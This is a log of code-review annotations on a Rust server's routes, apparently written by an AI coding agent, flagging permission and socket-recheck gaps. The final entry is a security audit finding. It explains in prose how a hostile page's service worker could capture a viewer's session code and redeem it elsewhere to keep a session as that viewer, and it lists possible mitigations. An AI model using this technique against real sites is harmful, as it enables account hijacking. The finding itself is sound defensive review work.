{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/artifacts.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-22T18:09:13.362561Z","id":"c2f28fedfb7ae695d07556776f1b7b7f54482b68273bb92e40c13554112e8045","body":{"detail":"fork_refusal checks read on the source and create at *, and the fork is the forking person's (artifacts.person). Whether they may read it afterwards is their rights' read locations: clax:collaborator reads * so it holds, but rights such as [{read, [<source>]}, {create, [*]}] fork and then answer 404 on the fork (crates/clax-server/tests/api_forks.rs builds such rights). The hosted prototype's owner always reads its own artifact.","kind":"concern","span":{"start":{"line":1408},"end":{"line":1447},"content_hash":"7b34fae6e686d18ea99a95eaffccebb0e001ea253f8220f11a58621833245198"},"suggested_fix":"Grant read on own artifacts with create, or refuse create without read at own.","summary":"Rights that grant create but read only named artifacts make a fork its forker cannot open","supersedes":"7f936847ad91890fa1938f81112b8eeefcb37209ffab5bdd4a0915850251bfde","tags":["forks","session:claude-code:6847a238-376f-486d-8e40-4d0fa676e347","session:claude-code:cc23b85c-a691-4093-ab7a-f909d7a53e66"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/room.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-22T18:09:13.419782Z","id":"1b65659770e447ef9b2259c02f4adc2aae43bf5dfb3a88c27a2547336e4a249c","body":{"detail":"RoomSocket::drain answers RoomStep::Recheck for a holder's socket on Event::SiteAccess, and the Worker's host (crates/clax-worker/src/instance.rs settle) answers Recheck with still_declared alone. The daemon's session rechecks clax_http::site_access::holder_reads (site_revoked in this file). A site_access change does not itself change a holder's right, so this matters only when a right was removed by a change that emits nothing a room hears; a visitor's socket closes on both paths.","kind":"concern","span":{"start":{"line":693},"end":{"line":703},"content_hash":"0d6fc6cdf57192c0836268410f772defcdd3277377191868ddc8599a0aff121d"},"suggested_fix":"Have the host's recheck call a RoomSocket method that runs holder_reads for a site holder beside still_declared.","summary":"On the Worker a site holder's room socket is checked again on Event::SiteAccess only for its artifact still declaring room, not for the holder still reading it","tags":["session:claude-code:cc23b85c-a691-4093-ab7a-f909d7a53e66"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/viewers.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-22T20:39:37.374012Z","id":"37045a88707f07f0e0a4f89925ebbfbd91ab7fe9cf18620b4898d29262ea6d06","body":{"detail":"set_seen refuses unless who.is_owner() or who.cookie is set, and a hosted session names its viewer in Identity::hosted_viewer, never in cookie, so a person's or guest's browser on a hosted daemon gets 400 no_viewer and People never shows 'Seen vN' for them. Seen in a port of web/e2e/presence.spec.ts to a hosted daemon (the assertion was changed to 'In 1 thread.' there).","kind":"concern","span":{"start":{"line":278},"end":{"line":294},"content_hash":"e4b691530bbf8d0a4dcc3c4620b479ff02ad49d762dd603b21951147eaa17914"},"summary":"A hosted daemon's signed-in person can never record a seen mark: PUT /api/viewers/me/seen answers 400 no_viewer","tags":["hosted","session:claude-code:cc23b85c-a691-4093-ab7a-f909d7a53e66"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/site_api.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-22T20:11:58.335607Z","id":"58ee434f3fd1890abed0a9640c985dee656e8804c3f04e22349304bea15b5576","body":{"detail":"The site API gives the room its caller through the SiteCaller extension (clax_http::db_caller::Subscriber::resolve) and a synthesized HostedRequest with cookie_sha256 None (holder_request in this file). A local daemon holds the socket in-process and never reopens it. The Worker's Durable Object reopens a woken socket from the SocketCredentials it kept (crates/clax-http/src/identity.rs SocketCredentials::of_request), which have no site holder or visitor ID, so after a wake a site's room socket would resolve as no one, or be refused. Covered by no test here: crates/clax-server/tests/api_site_api.rs the_room_opens_on_the_site_host_from_its_own_origin runs on the daemon alone.","kind":"concern","span":{"start":{"line":109},"end":{"line":112},"content_hash":"b3048e58d7ff7e3833c7dc5e6359e21dd9ce58b58befe31b0d96a2ccf19f8950"},"suggested_fix":"Keep the site caller (holder, or visitor ID) in SocketCredentials and recheck it with clax_http::site_access::caller_holder or site_open_to_world on reopen.","summary":"On the Worker a room socket opened through a site's /_clax/api/room is room_socket's, whose reopened socket finds its caller from SocketCredentials, which carry no SiteCaller","supersedes":"0ed9da172641c61e9fcdd31f5d8f99471c166b84f43f8d6fdf050f57bbfb7b43","tags":["session:claude-code:cc23b85c-a691-4093-ab7a-f909d7a53e66"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/site_api.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-22T20:11:58.354694Z","id":"18250a3d74be84d3565182da1c71f06337980d67ab1accedb1df3ae0fb4fa1e9","body":{"detail":"The limits live in Hosted (crates/clax-http/src/hosted.rs Limits), which a local daemon has none of. A local daemon's sites resolve on this machine alone (<id>.localhost), so its world visitors are its own browsers; the per-artifact caps (MAX_DOCS, MAX_DOC_BYTES) still bound what they store.","kind":"waiver","span":{"start":{"line":218},"end":{"line":225},"content_hash":"a9d8eacf28123c88e2dd2c0f754c10f1f6f8dacbd2c88ebca61090251515dae4"},"summary":"A local daemon counts no visitor writes: Attempt::SiteWrite limits only a hosted daemon's","supersedes":"5382668b0202b1774688af43c50a1fe31f290a1e07c6be902032e980714b22db","tags":["session:claude-code:cc23b85c-a691-4093-ab7a-f909d7a53e66"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/site_api.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-22T21:11:53.383327Z","id":"e6d94eee113d2ee2879a4945740d683a280a9680608645a8e5cc15353a5c5ac9","body":{"detail":"The site API gives the room its caller through the SiteCaller extension (clax_http::db_caller::Subscriber::resolve) and a synthesized HostedRequest with cookie_sha256 None (holder_request in this file). A local daemon holds the socket in-process and never reopens it. The Worker's Durable Object reopens a woken socket from the SocketCredentials it kept (crates/clax-http/src/identity.rs SocketCredentials::of_request), which have no site holder or visitor ID, so after a wake a site's room socket would resolve as no one, or be refused. Covered by no test here: crates/clax-server/tests/api_site_api.rs the_room_opens_on_the_site_host_from_its_own_origin runs on the daemon alone.","kind":"concern","span":{"start":{"line":116},"end":{"line":119},"content_hash":"b3048e58d7ff7e3833c7dc5e6359e21dd9ce58b58befe31b0d96a2ccf19f8950"},"suggested_fix":"Keep the site caller (holder, or visitor ID) in SocketCredentials and recheck it with clax_http::site_access::caller_holder or site_open_to_world on reopen.","summary":"On the Worker a room socket opened through a site's /_clax/api/room is room_socket's, whose reopened socket finds its caller from SocketCredentials, which carry no SiteCaller","supersedes":"58ee434f3fd1890abed0a9640c985dee656e8804c3f04e22349304bea15b5576","tags":["session:claude-code:cc23b85c-a691-4093-ab7a-f909d7a53e66"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/site_api.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-22T21:11:53.401905Z","id":"6c0747da6f6a309c6ceb995362d71763b21aa5b7074c9baed8323d1162476b88","body":{"detail":"The limits live in Hosted (crates/clax-http/src/hosted.rs Limits), which a local daemon has none of. A local daemon's sites resolve on this machine alone (<id>.localhost), so its world visitors are its own browsers; the per-artifact caps (MAX_DOCS, MAX_DOC_BYTES) still bound what they store.","kind":"waiver","span":{"start":{"line":225},"end":{"line":232},"content_hash":"a9d8eacf28123c88e2dd2c0f754c10f1f6f8dacbd2c88ebca61090251515dae4"},"summary":"A local daemon counts no visitor writes: Attempt::SiteWrite limits only a hosted daemon's","supersedes":"18250a3d74be84d3565182da1c71f06337980d67ab1accedb1df3ae0fb4fa1e9","tags":["session:claude-code:cc23b85c-a691-4093-ab7a-f909d7a53e66"]}}
{"metabox":"1","type":"annotation","subject":"crates/clax-server/src/routes/site.rs","issuer":"mailto:alex@kesling.co","issuer_type":"ai","created_at":"2026-10-23T15:37:22.086399Z","id":"5f1498295847705705b4d815d2cda81475134e8a66af9d7ec2cc1f4e2591fe2b","body":{"detail":"The artifact controls its whole origin, so a service worker it registers at / sees the /_clax/session?code=… navigation, and the state that code is bound to comes to the same origin through /_clax/session/start. A hostile author can forward both to a server of their own, redeem them there, and hold a renewable site session as that viewer on that one artifact after the visit, around HttpOnly. Reach is that artifact's app data and assets under the viewer's right; the site API serves no comments and no other artifact. Options: (a) accept as a waiver, since the author's page already acts as the viewer while it is open; (b) bind the session to something a remote redeemer lacks (the client's network address, or a device-bound key), at the cost of breaking on a network change; (c) unregister service workers (Clear-Site-Data) on redemption, which does not stop interception of that request itself. Decision needed.","kind":"concern","span":{"start":{"line":90},"end":{"line":129},"content_hash":"ce09abd07e78d020e33426ea23c9482bda6225ba4ae64315a6db2a0d19a91a14"},"summary":"A page's service worker can capture its viewer's site code and keep a session as that viewer","tags":["status:needs-decision","security","session:claude-code:cc23b85c-a691-4093-ab7a-f909d7a53e66"]}}
